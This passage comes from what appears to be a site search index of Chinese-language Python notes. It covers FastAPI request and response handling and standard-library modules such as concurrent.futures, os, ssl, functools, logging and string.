import Header, Cookie\nfrom fastapi import FastAPI\n\napp = FastAPI()\n\n@app.get(\"/items/\")\ndef read_item(user_agent: str = Header(None), session_token: str = Cookie(None)):\n    return {\"User-Agent\": user_agent, \"Session-Token\": session_token} 以上代码在浏览器访问 http://127.0.0.1:8000/items/ ，返回了 JSON 数据: {\"User-Agent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15\",\"Session-Token\":null} 重定向和状态码 使用 RedirectResponse 实现重定向，将客户端重定向到 /items/ 路由: from fastapi import Header, Cookie\nfrom fastapi import FastAPI\nfrom fastapi.responses import RedirectResponse\n\napp = FastAPI()\n\n@app.get(\"/items/\")\ndef read_item(user_agent: str = Header(None), session_token: str = Cookie(None)):\n    return {\"User-Agent\": user_agent, \"Session-Token\": session_token}\n\n@app.get(\"/redirect\")\ndef redirect():\n    return RedirectResponse(url=\"/items/\") 使用 HTTPException 抛出异常，返回自定义的状态码和详细信息。\n以下实例在 item_id 为 42 会返回 404 状态码: from fastapi import HTTPException\n\n@app.get(\"/items/{item_id}\")\ndef read_item(item_id: int):\n    if item_id == 42:\n        raise HTTPException(status_code=404, detail=\"Item not found\")\n    return {\"item_id\": item_id} 自定义响应头 使用 JSONResponse 自定义响应头: from fastapi import FastAPI\nfrom fastapi.responses import JSONResponse\n\napp = FastAPI()\n\n@app.get(\"/items/{item_id}\")\ndef read_item(item_id: int):\n    content = {\"item_id\": item_id}\n    headers = {\"X-Custom-Header\": \"custom-header-value\"}\n    return JSONResponse(content=content, headers=headers)","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Fastapi-Request-and-response.html","loc":"/yq-docs-rear-end-python-Web-framework-Fastapi-Request-and-response.html"},{"title":"简单使用","text":"参考: 第一个 FastAPI 应用 简单使用: # main.py\nfrom fastapi import FastAPI\n\napp = FastAPI()\n\n@app.get(\"/\")\ndef read_root():\n    return {\"Hello\": \"World\"} 在命令行中运行以下命令以启动应用: uvicorn main:app --reload 注解 --reload 表示代码修改后自动重启服务器 打开浏览器并访问 http://127.0.0.1:8000 ，\n你应该能够看到 FastAPI 自动生成的交互式文档，并在根路径 (\"/\") 返回的 JSON 响应: {\"Hello\": \"World\"} 接下来我们来丰富下代码功能，并做具体说明\n以下的 FastAPI 应用，使用了两个路由操作（/ 和 /items/{item_id}）: from typing import Union\n\nfrom fastapi import FastAPI\n\napp = FastAPI()\n\n\n@app.get(\"/\")\ndef read_root():\n    return {\"Hello\": \"World\"}\n\n\n@app.get(\"/items/{item_id}\")\ndef read_item(item_id: int, q: Union[str, None] = None):\n    return {\"item_id\": item_id, \"q\": q} 其中, 定义带路径参数和查询参数的路由操作: @app.get(\"/items/{item_id}\")\ndef read_item(item_id: int, q: Union[str, None] = None):\n    return {\"item_id\": item_id, \"q\": q} 函数接受两个参数: item_id --是路径参数，指定为整数类型。 q -- 是查询参数，指定为字符串类型或空（None）。 访问: http://127.0.0.1:8000/items/5?q=tttt9 你将会看到如下 JSON 响应: {\"item_id\":\"5\",\"q\":\"tttt9\"}","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Fastapi-Simply-use.html","loc":"/yq-docs-rear-end-python-Web-framework-Fastapi-Simply-use.html"},{"title":"常见问题","text":"自定义请求头, 见 FastAPI-自定义请求头 重定向和状态码, 见 FastAPI-重定向和状态码 自定义响应头, 见 FastAPI-自定义响应头","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Fastapi-common-problem.html","loc":"/yq-docs-rear-end-python-Web-framework-Fastapi-common-problem.html"},{"title":"concurrent","text":"官网: https://docs.python.org/zh-cn/3/library/concurrent.html 目前就一个包: concurrent.futures —— 启动并行任务 concurrent.futures 模块提供异步执行可调用对象高层接口。 异步执行可以由 ThreadPoolExecutor 使用线程或由 ProcessPoolExecutor 使用单独的进程来实现。\n两者都是实现抽像类 Executor 定义的接口。 Executor class concurrent.futures.Executor 抽象类提供异步执行调用方法。要通过它的子类调用，而不是直接调用。 submit(fn, /, *args, **kwargs) 调度可调用对象 fn，以 fn(*args, **kwargs) 方式执行并返回一个代表该可调用对象的执行的 Future 对象: with ThreadPoolExecutor(max_workers=1) as executor:\n    future = executor.submit(pow, 323, 1235)\n    print(future.result()) map(func, *iterables, timeout=None, chunksize=1) 类似于 map(func, *iterables) 函数，除了以下两点: iterables 是立即执行而不是延迟执行的； func 是异步执行的，对 func 的多个调用可以并发执行。 timeout: Union[int, float, None] 当超时时, 将会触发 超时 异常(raises TimeoutError) 如果 func 调用引发一个异常，当从迭代器中取回它的值时这个异常将被引发。 使用 ProcessPoolExecutor 时，这个方法会将 iterables 分割任务块并作为独立的任务并提交到执行池中。\n这些块的大概数量可以由 chunksize 指定正整数设置。\n对很长的迭代器来说，使用大的 chunksize 值比默认值 1 能显著地提高性能。 chunksize 对 ThreadPoolExecutor 没有效果。 返回的是执行结果的生成器迭代, 保持于 iterables 的顺序一致: from concurrent.futures import ThreadPoolExecutor\n\nwith ThreadPoolExecutor(max_workers=3) as t:\n    d = t.map(lambda x: x**2, [1, 2, 3, 8])\n    print(type(d))\n    for x in d:\n        print(x, type(x)) 输出: <class 'generator'>\n1 <class 'int'>\n4 <class 'int'>\n9 <class 'int'>\n64 <class 'int'> 在 3.5 版更改: 加入 chunksize 参数。 shutdown(wait=True, *, cancel_futures=False) 当待执行的 future 对象完成执行后向执行者发送信号，它就会释放正在使用的任何资源。\n在关闭后调用 Executor.submit() 和 Executor.map() 将会引发 RuntimeError。 wait: bool = True wait 为 True, 则此方法只有在所有待执行的 future 对象完成执行且释放已分配的资源后才会返回。 wait 为 False，方法立即返回，所有待执行的 future 对象完成执行后会释放已分配的资源。 不管 wait 的值是什么，整个 Python 程序将等到所有待执行的 future 对象完成执行后才退出。 cancel_futures: bool=False cancel_futures 为 True，此方法将取消所有执行器还未开始运行的挂起的 Future。\n任何已完成或正在运行的 Future 将不会被取消，无论 cancel_futures 的值是什么？ 如果 cancel_futures 和 wait 均为 True，则执行器已开始运行的所有 Future 将在此方法返回之前完成。 其余的 Future 会被取消。 如果使用 with 语句，你就可以避免显式调用这个方法，\n它将会停止 Executor (就好像 Executor.shutdown() 调用时 wait 设为 True 一样等待): import shutil\nwith ThreadPoolExecutor(max_workers=4) as e:\n    e.submit(shutil.copy, 'src1.txt', 'dest1.txt')\n    e.submit(shutil.copy, 'src2.txt', 'dest2.txt')\n    e.submit(shutil.copy, 'src3.txt', 'dest3.txt')\n    e.submit(shutil.copy, 'src4.txt', 'dest4.txt') 在 3.9 版更改: 增加了 cancel_futures。 ThreadPoolExecutor concurrent.futures.ThreadPoolExecutor ThreadPoolExecutor 是 Executor 的子类，它使用线程池来异步执行调用。 当可调用对象已关联了一个 Future 然后在等待另一个 Future 的结果时就会导致死锁情况。例如: import time\ndef wait_on_b():\n    time.sleep(5)\n    print(b.result())  # b will never complete because it is waiting on a.\n    return 5\n\ndef wait_on_a():\n    time.sleep(5)\n    print(a.result())  # a will never complete because it is waiting on b.\n    return 6\n\nexecutor = ThreadPoolExecutor(max_workers=2)\na = executor.submit(wait_on_b)\nb = executor.submit(wait_on_a) 与: def wait_on_future():\n    f = executor.submit(pow, 5, 2)\n    # This will never complete because there is only one worker thread and\n    # it is executing this function.\n    print(f.result())\n\nexecutor = ThreadPoolExecutor(max_workers=1)\nexecutor.submit(wait_on_future) ProcessPoolExecutor ProcessPoolExecutor 类是 Executor 的子类，它使用进程池来异步地执行调用。\nProcessPoolExecutor 会使用 multiprocessing 模块，\n这允许它绕过 全局解释器锁 但也意味着只可以处理和返回可封存的对象。 __main__ 模块必须可以被工作者子进程导入。这意味着 ProcessPoolExecutor 不可以工作在交互式解释器中。 从可调用对象中调用 Executor 或 Future 的方法提交给 ProcessPoolExecutor 会导致死锁。 class concurrent.futures.ProcessPoolExecutor(max_workers=None, mp_context=None, initializer=None, initargs=(), max_tasks_per_child=None) 异步地执行调用的 Executor 子类使用最多具有 max_workers 个进程的进程池。 max_workers: 如果 max_workers 为 None 或未给出，它将默认为机器的处理器个数。\n如果 max_workers 小于等于 0，则将引发 ValueError。 在 Windows 上，max_workers 必须小于等于 61，否则将引发 ValueError。\n如果 max_workers 为 None，则所选择的默认值最多为 61，即使存在更多的处理器。 mp_context: 可以是一个多进程上下文或是 None。 它将被用来启动工作进程。 如果 mp_context 为 None 或未给出，则将使用默认的多进程上下文。 initializer: 一个可选的可调用对象，它会在每个工作进程启动时被调用； initargs: 传给 initializer 的参数元组。\n如果 initializer 引发了异常，则所有当前在等待的任务以及任何向进程池提交更多任务的尝试都将引发 BrokenProcessPool。 max_tasks_per_child: = None 可选参数, 表示单个进程可执行的最大任务数. 超出将会使用新的进程(刷新). 默认 None 表示工作进程将会一直存活到进程池终止. 在默认情况,缺少MP_CONTEXT参数, 且指定了最大值时，将使用 spawn() 多进程启动方法. 与 fork() 启动方式不兼容. 在 3.3 版更改:\n如果其中一个工作进程被突然终止，BrokenProcessPool 就会马上触发。\n可预计的行为没有定义，但执行器上的操作或它的 future 对象会被冻结或死锁。 在 3.7 版更改: 添加 mp_context 参数允许用户控制由进程池创建给工作者进程的开始方法 。 加入 initializer 和*initargs* 参数。 在 3.11 版更改: The max_tasks_per_child argument was added to allow users\nto control the lifetime of workers in the pool. Future Future 类将可调用对象封装为异步执行。Future 实例由 Executor.submit() 创建。 class concurrent.futures.Future 将可调用对象封装为异步执行。Future 实例由 Executor.submit() 创建，除非测试，不应直接创建。 cancel() 尝试取消调用。 如果调用正在执行或已结束运行不能被取消则该方法将返回 False，否则调用会被取消并且该方法将返回 True。 cancelled() 如果调用成功取消返回 True。 running() 如果调用正在执行而且不能被取消那么返回 True 。 done() 如果调用已被取消或正常结束那么返回 True。 result(timeout=None) Return the value returned by the call.\nIf the call hasn't yet completed then this method will wait up to timeout seconds.\nIf the call hasn't completed in timeout seconds, then a TimeoutError will be raised.\ntimeout can be an int or float.\nIf timeout is not specified or None, there is no limit to the wait time. 如果 futrue 在完成前被取消则 CancelledError 将被触发。 如果调用引发了一个异常，这个方法也会引发同样的异常。 exception(timeout=None) Return the exception raised by the call.\nIf the call hasn't yet completed then this method will wait up to timeout seconds.\nIf the call hasn't completed in timeout seconds, then a TimeoutError will be raised.\ntimeout can be an int or float.\nIf timeout is not specified or None, there is no limit to the wait time. 如果 futrue 在完成前被取消则 CancelledError 将被触发。 如果调用正常完成那么返回 None。 add_done_callback(fn) 附加可调用 fn 到 future 对象。\n当 future 对象被取消或完成运行时，将会调用 fn，而这个 future 对象将作为它唯一的参数。 加入的可调用对象总被属于添加它们的进程中的线程按加入的顺序调用。\n如果可调用对象引发一个 Exception 子类，它会被记录下来并被忽略掉。\n如果可调用对象引发一个 BaseException 子类，这个行为没有定义。 如果 future 对象已经完成或已取消，fn 会被立即调用。 下面这些 Future 方法用于单元测试和 Executor 实现. set_running_or_notify_cancel() 这个方法只可以在执行关联 Future 工作之前由 Executor 实现调用或由单测试调用。 线程将会等待 Future实例 执行完成. 类似执行 as_completed() or wait() Return: False: Future实例被退出. 类似 Future.cancel() == True True: Future实例不可退出, 处于 running 状态. Future.running() == True. 这个方法只可以被调用一次并且不能在调用 Future.set_result() 或 Future.set_exception() 之后再调用。 set_result(result) 设置将 Future 关联工作的结果给 result 。 这个方法只可以由 Executor 实现和单元测试使用。 在 3.8 版更改: 如果 Future 已经完成则此方法会引发 concurrent.futures.InvalidStateError。 set_exception(exception) 设置 Future 关联工作的结果给 Exception exception 。 这个方法只可以由 Executor 实现和单元测试使用。 在 3.8 版更改: 如果 Future 已经完成则此方法会引发 concurrent.futures.InvalidStateError。 模块函数 wait as_completed concurrent.futures.wait(fs, timeout=None, return_when=ALL_COMPLETED) 等待由 fs 指定的 Future 实例（可能由不同的 Executor 实例创建）完成。\n重复传给 fs 的 future 会被移除并将只返回一次。 返回一个由集合组成的具名 2 元组。 第一个集合的名称为 done，包含在等待完成之前已完成的 future（包括正常结束或被取消的 future）。 第二个集合的名称为 not_done，包含未完成的 future（包括挂起的或正在运行的 future）。 timeout: Union[int, float, None] timeout 可以用来控制返回前最大的等待秒数。 如果 timeout 未指定或为 None ，则不限制等待时间。 return_when: 指定此函数应在何时返回。它必须为以下常数之一: 常量 描述 FIRST_COMPLETED 函数将在任意可等待对象结束或取消时返回。 FIRST_EXCEPTION 函数将在任意可等待对象因引发异常而结束时返回。当没有引发任何异常时它就相当于 ALL_COMPLETED。 ALL_COMPLETED 函数将在所有可等待对象结束或取消时返回。 concurrent.futures.as_completed(fs, timeout=None) 返回多个已执行完成的 Future 对象的迭代器(状态: 执行完成或退出) 调用之前就完成的回最先返回. fs: 多个 Future 对象的列表 timeout: Union[int, float, None] . Exception 类 CancelledError TimeoutError BrokenExecutor InvalidStateError BrokenThreadPool BrokenProcessPool exception concurrent.futures.CancelledError future 对象被取消时会触发。 exception concurrent.futures.TimeoutError A deprecated alias of TimeoutError, raised when a future operation exceeds the given timeout. 在 3.11 版更改: This class was made an alias of TimeoutError. exception concurrent.futures.BrokenExecutor 当执行器被某些原因中断而且不能用来提交或执行新任务时就会被引发派生于 RuntimeError 的异常类。 3.7 新版功能. exception concurrent.futures.InvalidStateError 当某个操作在一个当前状态所不允许的 future 上执行时将被引发。 3.8 新版功能. exception concurrent.futures.thread.BrokenThreadPool 当 ThreadPoolExecutor 中的其中一个工作者初始化失败时会引发派生于 BrokenExecutor 的异常类。 3.7 新版功能. exception concurrent.futures.process.BrokenProcessPool 当 ThreadPoolExecutor 中的其中一个工作者不完整终止时(比如，被外部杀死)\n会引发派生于 BrokenExecutor ( 原名 RuntimeError ) 的异常类。 3.3 新版功能.","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-Concurrent.html","loc":"/yq-docs-rear-end-python-python-standard-library-Concurrent.html"},{"title":"os","text":"官网: os --- 多种操作系统接口 属性 os.environ 一个 mapping 对象，其中键值是代表进程环境的字符串。\n例如，environ['HOME'] 是你的主目录（在某些平台上）的路径名，相当于 C 中的 getenv(\"HOME\")。 函数 os.ctermid() 返回与进程控制终端对应的文件名。 os.get_terminal_size(fd=STDOUT_FILENO, /) 返回终端窗口的尺寸，格式为 (columns, lines)，它是类型为 terminal_size 的元组。 可选参数 fd （默认为 STDOUT_FILENO 或标准输出）指定应查询的文件描述符。 如果文件描述符未连接到终端，则抛出 OSError 异常。 shutil.get_terminal_size() 是供常规使用的高阶函数，os.get_terminal_size 是其底层的实现。 可用性: Unix, Windows。 os.walk(top, topdown=True, onerror=None, followlinks=False) 生成目录树中的文件名，方式是按上->下或下->上顺序浏览目录树。\n对于以 top 为根的目录树中的每个目录（包括 top 本身），\n它都会生成一个三元组 (dirpath, dirnames, filenames)。 os.path.getsize(path) 获取指定路径 path 下的文件的大小，以字节为单位\n计算机中的单位换算: 字节→1024-K→1024-M→1024-G→1024-T… os.popen(command[, mode[, bufsize]]) 用于从一个命令打开一个管道。\n在Unix，Windows中有效 参数 command 使用的命令。 mode 模式权限可以是 ‘r'(默认) 或 ‘w'。 bufsize 指明了文件需要的缓冲大小：0意味着无缓冲；1意味着行缓冲；\n其它正值表示使用参数大小的缓冲（大概值，以字节为单位）。\n负的bufsize意味着使用系统的默认值，\n一般来说，对于tty设备，它是行缓冲；\n对于其它文件，它是全缓冲。如果没有改参数，使用系统的默认值。 返回值 返回一个文件描述符号为fd的打开的文件对象 这种调用方式是通过管道的方式来实现，函数返回一个file对象，\n里面的内容是脚本输出的内容（可简单理解为echo输出的内容），使用os.popen调用test.sh的情况: >> import os\n>>> os.popen(\"./test.sh\")\n<open file './test.sh', mode 'r' at 0x7f6cbbbee4b0>\n>>> f=os.popen(\"./test.sh\")\n>>> f\n<open file './test.sh', mode 'r' at 0x7f6cbbbee540>\n>>> f.readlines()\n['hello python!\\n', 'hello world!\\n']\n>>> 注解 os.popen不会等cmd命令执行完毕就继续下面的代码(非阻塞),\n可以调用 readlines() 强行读阻塞. python调用Shell脚本，有两种方法：os.system()和os.popen(),\n前者返回值是脚本的退出状态码，后者的返回值是脚本执行过程中的输出内容 os.system(command) 该方法在调用完shell脚本后，返回一个16位的二进制数，\n低位为杀死所调用脚本的信号号码，高位为脚本的退出状态码，\n即脚本中\"exit 1\"的代码执行后，os.system函数返回值的高位数则是1，\n如果低位数是0的情况下，则函数的返回值是0x0100,换算为十进制得到256。 要获得os.system的正确返回值，可以使用位移运算（将返回值右移8位）还原返回值: >>> import os\n>>> os.system(\"./test.sh\")\nhello python!\nhello world!\n256\n>>> n=os.system(\"./test.sh\")\nhello python!\nhello world!\n>>> n\n256\n>>> n>>8\n1\n>>> os.chmod(path, mode) 更改文件权限 比如改为 755: os . chmod ( file , 0o755 ) path 文件名路径或目录路径。 flags 可用以下选项按位或操作生成， 目录的读权限表示可以获取目录里文件名列表， ，执行权限表示可以把工作目录切换到此目录 ，删除添加目录里的文件必须同时有写和执行权限 ，文件权限以用户id->组id->其它顺序检验,最先匹配的允许或禁止权限被应用。 stat.S_IXOTH: 其他用户有执行权0o001 stat.S_IWOTH: 其他用户有写权限0o002 stat.S_IROTH: 其他用户有读权限0o004 stat.S_IRWXO: 其他用户有全部权限(权限掩码)0o007 stat.S_IXGRP: 组用户有执行权限0o010 stat.S_IWGRP: 组用户有写权限0o020 stat.S_IRGRP: 组用户有读权限0o040 stat.S_IRWXG: 组用户有全部权限(权限掩码)0o070 stat.S_IXUSR: 拥有者具有执行权限0o100 stat.S_IWUSR: 拥有者具有写权限0o200 stat.S_IRUSR: 拥有者具有读权限0o400 stat.S_IRWXU: 拥有者有全部权限(权限掩码)0o700 stat.S_ISVTX: 目录里文件目录只有拥有者才可删除更改0o1000 stat.S_ISGID: 执行此文件其进程有效组为文件所在组0o2000 stat.S_ISUID: 执行此文件其进程有效用户为文件所有者0o4000 stat.S_IREAD: windows下设为只读 stat.S_IWRITE: windows下取消只读","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-OS.html","loc":"/yq-docs-rear-end-python-python-standard-library-OS.html"},{"title":"ssl","text":"官网: https://docs.python.org/zh-cn/3/library/ssl.html 套接字对象的TLS/SSL封装 该模块提供了对传输层安全（通常称为 \"安全套接字层\"）加密和网络套接字的对等认证设施的访问，\n包括客户端和服务器端。 该模块使用 OpenSSL 库。\n它可以在所有现代 Unix 系统、 Windows 、 macOS 和可能的其他平台上使用，只要 OpenSSL 安装在该平台上。 主要的一个API SSLContext.wrap_socket(sock, server_side=False, do_handshake_on_connect=True, suppress_ragged_eofs=True, server_hostname=None, session=None) 包装一个现有的 Python 套接字 sock 并返回一个\nSSLContext.sslsocket_class 的实例 (默认为 SSLSocket)。\n返回的 SSL 套接字会绑定上下文、设置以及证书。\nsock 必须是一个 SOCK_STREAM 套接字；其他套接字类型不被支持。 server_side: bool 标明希望从该套接字获得服务器端行为还是客户端行为 对于客户端套接字，上下文的构造会延迟执行；\n如果下层的套接字尚未连接，上下文的构造将在对套接字调用 connect() 之后执行。 对于服务器端套接字，如果套接字没有远端对等方，它会被视为一个监听套接字，\n并且服务器端 SSL 包装操作会在通过 accept() 方法所接受的客户端连接上自动执行。\n此方法可能会引发 SSLError。 server_hostname: 用在客户端连接上，指定所要连接的服务的主机名。\n这允许单个服务器托管具有单独证书的多个基于 SSL 的服务，\n很类似于 HTTP 虚拟主机。\n如果 server_side 为真值则指定 server_hostname 将引发 ValueError。 do_handshake_on_connect: 指明是否要在调用 socket.connect() 之后自动执行 SSL 握手，\n还是要通过发起调用 SSLSocket.do_handshake() 方法让应用程序显式地调用它。\n显式地调用 SSLSocket.do_handshake() 可给予程序对握手中所涉及的套接字 I/O 阻塞行为的控制。 suppress_ragged_eofs: 形参 suppress_ragged_eofs 指明 SSLSocket.recv() 方法\n应当如何从连接的另一端发送非预期的 EOF 信号。\n如果指定为 True (默认值)，它将返回正常的 EOF (空字节串对象)\n来响应从下层套接字引发的非预期的 EOF 错误；\n如果指定为 False，它将向调用方引发异常。 session，参见 session。 在 3.5 版更改: 总是允许传送 server_hostname，即使 OpenSSL 没有 SNI。 在 3.6 版更改: 增加了 session 参数。 在 3.7 版更改: The method returns an instance of SSLContext.sslsocket_class instead of hard-coded SSLSocket.","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-SSL.html","loc":"/yq-docs-rear-end-python-python-standard-library-SSL.html"},{"title":"functools","text":"官网 wraps functools.wraps() 用于自定义装饰器, 刷新名称 partial 也叫偏函数 functools.partial() 用于包装函数, 可用于函数回调的时候, 增加参数, 或者说固定参数: def show(name, age):\n    print(\"my name is {} and age is {}\".format(name, age))\n\n\n# 相当于生成一个新的函数\n# def new_fun():\n#   show(\"x x x\",1)\n# 如果\n# showP = functools.partial(show, \"xxx\")    # 固定第一个参数为 xxx\n# showP(20)\n# 结果一样\nshowP = functools.partial(show, \"xxx\", 20)  # 固定前两个参数为 xxx, 20, 也适用于关键字参数\n\n\ndef test(callback):\n    print(\"do some opt…………\")\n    callback()\n\n\ntest(showP)\n\n# do some opt…………\n# my name is xxx and age is 19 用途: 有些回调函数不支持传入参数, 可以使用此函数来支持参数. total_ordering 装饰器, 实现比较方法 @functools.total_ordering 给定一个声明一个或多个全比较排序方法的类，这个类装饰器实现剩余的方法。这减轻了指定所有可能的全比较操作的工作。 此类必须包含以下方法之一：__lt__() 、__le__()、__gt__() 或 __ge__()。另外，此类必须支持 __eq__() 方法。 例如: @total_ordering\nclass Student:\n    def _is_valid_operand(self, other):\n        return (hasattr(other, \"lastname\") and\n                hasattr(other, \"firstname\"))\n    def __eq__(self, other):\n        if not self._is_valid_operand(other):\n            return NotImplemented\n        return ((self.lastname.lower(), self.firstname.lower()) ==\n                (other.lastname.lower(), other.firstname.lower()))\n    def __lt__(self, other):\n        if not self._is_valid_operand(other):\n            return NotImplemented\n        return ((self.lastname.lower(), self.firstname.lower()) <\n                (other.lastname.lower(), other.firstname.lower())) 注解 虽然此装饰器使得创建具有良好行为的完全有序类型变得非常容易，\n但它 确实 是以执行速度更缓慢和派生比较方法的堆栈回溯更复杂为代价的。\n如果性能基准测试表明这是特定应用的瓶颈所在，则改为实现全部六个富比较方法应该会轻松提升速度。 这个装饰器不会尝试重载类 或其上级类 中已经被声明的方法。\n这意味着如果某个上级类定义了比较运算符，则 total_ordering 将不会再次实现它，即使原方法是抽象方法。 3.2 新版功能. 在 3.4 版更改: 现在已支持从未识别类型的下层比较函数返回 NotImplemented 异常。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-functools.html","loc":"/yq-docs-rear-end-python-python-standard-library-functools.html"},{"title":"logging","text":"官网: https://docs.python.org/zh-cn/3/library/logging.html 知乎有篇总结的貌似也可以: https://zhuanlan.zhihu.com/p/425678081 算是内置的一个灵活的日志库 部分函数/模块使用说明 logging.basicConfig 最直接的使用是直接调用模块级别函数如: import logging\nlogging.info('xxxx') 最简单的配置是使用 logging.basicConfig , 这会设置一个全局的日志配置, 如果多次调用, 以第一次的配置信息为准,\n如设置日志: logging.basicConfig(filename='tmp_log.log', level=logging.DEBUG) 亦可设置日志格式: logging.basicConfig(format='%(asctime)s %(levelname)s: %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p') logging.getLogger 获取日志处理器 可传入一个字符串参数, 表示处理器名, 多次调用且使用同一个字符串时, 返回同一个handler 若不传入参数, 表示获取 root logger logging.StreamHandler logging.StreamHandler() 获取一个stream的handler, 可添加给上面 getLogger 获取到的 logger,\n表示输出到控制台. logging.FileHandler logging.FileHandler(filename='', mode='a') 获取一个文件handler, 表示将结果输出到文件 logging.Formatter 定义日志格式, 如: _formatter = \\\nlogging.Formatter('%(asctime)s - %{pathname}s[line:%{lineno}d] - %(levelname)s: %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p') 设置好的 _formatter 可设置给handler(比如上面 FileHandler 的实例对象) 支持的格式字符串(部分): %(levelname)s: 日志级别(INFO、DEBUG、WARNING、ERROR等) %(filename)s: 发生日志记录的文件名称 %(funcName)s: 发生日志记录的函数名称 %(lineno)d: 发生日志记录的代码行数 %(asctime)s: 日志记录的时间,默认格式为%Y-%m-%d %H:%M:%S %(message)s: 日志记录的消息正文 %(name)s: Logger的名称 %(threadName)s: 线程名称 %(process)d: 进程ID %{pathname}s: 所执行程序所在路径, 绝对路径 %(filename)s : 所执行程序所在路径, 相对路径 logging.handlers logging.handlers模块提供了几种日志处理程序,用于处理日志记录。主要有以下几种: RotatingFileHandler:日志轮询处理,可以支持日志文件达到一定大小后自动切割为多个文件。 TimedRotatingFileHandler:日志定期轮询,可以按时间切割日志文件。 SMTPHandler:通过SMTP协议发送日志邮件。 HTTPHandler:将日志记录发送到HTTP服务器。 SocketHandler:将日志发送到网络套接字。 QueueHandler: 将日志记录发送到队列,由其他进程从队列中获取日志记录进行处理。 SysLogHandler:通过Syslog协议发送日志到syslog守护进程 RotatingFileHandler logging.handlers.RotatingFileHandler(filename, mode='a', maxBytes=0, backupCount=0, encoding=None, delay=False, errors=None) filename: 设置日志文件名 mode: 设置日志文件的打开模式，默认为'a'（追加模式） maxBytes: 设置每个日志文件的最大大小，单位是字节。当日志文件达到指定大小时，就会自动备份文件并创建新的日志文件 backupCount: 设置保留日志文件的数量。当日志文件达到指定数量时，就会循环覆盖最早的日志文件 encoding: 设置日志文件的编码格式 delay: 如果设置为True，则直到第一次使用handler来处理日志记录之前才会创建日志文件 如日志文件名为app.log, 最多10M, 保留最近5个日志文件: handler = RotatingFileHandler('app.log', maxBytes=10*1024*1024, backupCount=5) TimedRotatingFileHandler logging.handlers.TimedRotatingFileHandler(filename, when='h', interval=1, backupCount=0, encoding=None, delay=False, utc=False, atTime=None, errors=None) when 来指定 interval 的类型. 可能的值列表如下。 请注意它们不是大小写敏感的: 值 间隔类型 如果/如何使用 atTime 'S' 秒 忽略 'M' 分钟 忽略 'H' 小时 忽略 'D' 天 忽略 'W0'-'W6' 工作日(0=星期一) 用于计算初始轮换时间 'midnight' 如果未指定 atTime 则在午夜执行轮换，否则将使用 atTime。 用于计算初始轮换时间 通过TimedRotatingFileHandler每天做日志文件轮询,实现日志文件按日切割的功能: import logging\nfrom logging.handlers import TimedRotatingFileHandler\n\nlogger = logging.getLogger(__name__)\nlogger.setLevel(logging.INFO)\n\n# 每天做日志轮询\nhandler = TimedRotatingFileHandler('app.log', when='D', interval=1, backupCount=7)\nlogger.addHandler(handler)\n\nlogger.info('Start') SMTPHandler 通过SMTPHandler将日志发送邮件的方式进行处理: import logging\nfrom logging.handlers import SMTPHandler\n\nlogger = logging.getLogger(__name__)\nlogger.setLevel(logging.ERROR)\n\n# 通过SMTP发送日志邮件\nmail_handler = SMTPHandler(mailhost='smtp.gmail.com',\n                          fromaddr='from@example.com',\n                          toaddrs=['to@example.com'],\n                          subject='Application Error',\n                          credentials=credentials)\nlogger.addHandler(mail_handler)\n\nlogger.error('Error occurred') 日志级别 日志等级: critical > error > warning > info > debug 级别越高打印的越少. debug         : 打印 debug, info, warning, error, critical 级别的日志 info          : 打印 info, warning, error, critical 级别的日志 warning       : 打印 warning, error, critical 级别的日志 error         : 打印 error, critical 级别的日志 critical      : 打印 critical 级别 注解 默认只打印大于等于warning级别的日志 自定义配置(可选) logging标准模块支持三种配置方式: dictConfig\ndictConfig 是通过一个字典进行配置 Logger，Handler，Filter，Formatter； fileConfig\nfileConfig 则是通过一个文件进行配置； listen\nlisten 则监听一个网络端口，通过接收网络数据来进行配置。 除此之外, 也可以直接调用 Logger，Handler 等对象中的方法在代码中来显式配置, 如: import logging\n_logger = logging.getLogger(__name__)\n\n# 之后调用跟普通调用一样\n_logger.info('info msg') 说明: logger只是一个日志器, 真正处理的的handler, 然后handler可以设置 Filter 和 Formatter 参考:: https://zhuanlan.zhihu.com/p/425678081 将单独的logger记录到日志文件 无论对 logging.getLogger('someLogger') 进行多少次调用，都会返回同一个 logger 对象的引用。\n不仅在同一个模块内如此，只要是在同一个 Python 解释器进程中，跨模块调用也是一样。 同样是引用同一个对象，应用程序也可以在一个模块中定义和配置一个父 logger，\n而在另一个单独的模块中创建（但不配置）子 logger，对于子 logger 的所有调用都会传给父 logger。 比如在一个单独的logger下添加到其他位置: 定义一个普通logger: logger = logging.getLogger(__name__)\nlogger.setLevel(logging.DEBUG) 定义一个文件处理logger: logger_file_handler = logging.FileHandler('log_test.log')\nlogger_file_handler.setLevel(logging.DEBUG) 定义一个流handler的logger: logger_stream_handler = StreamHandler()\nlogger_stream_handler.setLevel(logging.INFO) 可以先设置一下格式: formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')\nlogger_file_handler.setFormatter(formatter)\nlogger_stream_handler.setFormatter(formatter) 将文件和流的logger作为子logger加入到最开始的普通logger: logger.addHandler(logger_file_handler)\nlogger.addHandler(logger_stream_handler) 详细见:: logging --- Python 的日志记录工具 日志操作手册 日志没输出到控制台 从两个方面看: 设置日志输出级别 设置流式输出(即控制台输出)的handler 例: # 获取处理器\n_logger = logging.getLogger(__name__)\n\n# 实例 stream handler\n_console_handler = logging.StreamHandler()\n\n# 给处理器增加handler\n_logger.addHandler(_console_handler)\n\n# 设置日志级别\n_logger.setLevel(logging.INFO)","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-logging.html","loc":"/yq-docs-rear-end-python-python-standard-library-logging.html"},{"title":"string","text":"官网: https://docs.python.org/zh-cn/3/library/string.html 常见的字符串操作 字符串常量 此模块中定义的常量为： string.ascii_letters 下文所述 ascii_lowercase 和 ascii_uppercase 常量的拼连。 该值不依赖于语言区域。 string.ascii_lowercase 小写字母 'abcdefghijklmnopqrstuvwxyz'。 该值不依赖于语言区域，不会发生改变。 string.ascii_uppercase 大写字母 